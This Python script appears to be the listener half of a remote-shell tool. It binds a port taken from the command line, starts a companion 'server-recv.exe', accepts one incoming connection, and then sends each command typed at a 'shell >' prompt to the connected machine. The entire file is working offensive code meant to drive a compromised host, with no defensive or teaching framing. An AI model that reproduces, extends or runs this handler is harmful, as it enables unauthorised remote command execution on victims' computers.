import argparse
import os
import threading
import socket




def start():
    os.system("taskkill /f /im server-recv.exe")
    os.system('bin\listen\server-recv.exe')



def listen(lport):
    #messagebox.showinfo("listen",'listen is start')
    tcp_service_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    tcp_service_socket.bind(('',int(lport)))
    print('start server.............')
    t = threading.Thread(target=start)
    t.start()
    print('listen on '+str(lport) + '.......')

    tcp_service_socket.listen(128)#3 让默认套接字由主动变为被动(监听)
    client_socket,clientAddr =  tcp_service_socket.accept()
    print('[*]连接成功!')
    
    #with open('conf.txt',w) as f:
        #f.write(str(lport))
    while True:
        cmd = input("shell >").strip()
        client_socket.send(cmd.encode('utf-8'))


def main():
    global lport
    parser = argparse.ArgumentParser(description='listen')
    parser.add_argument('lport',help='set port')
    args = parser.parse_args()
    lport = args.lport
    print(lport)
    listen(lport)
if __name__ == "__main__":
    main()


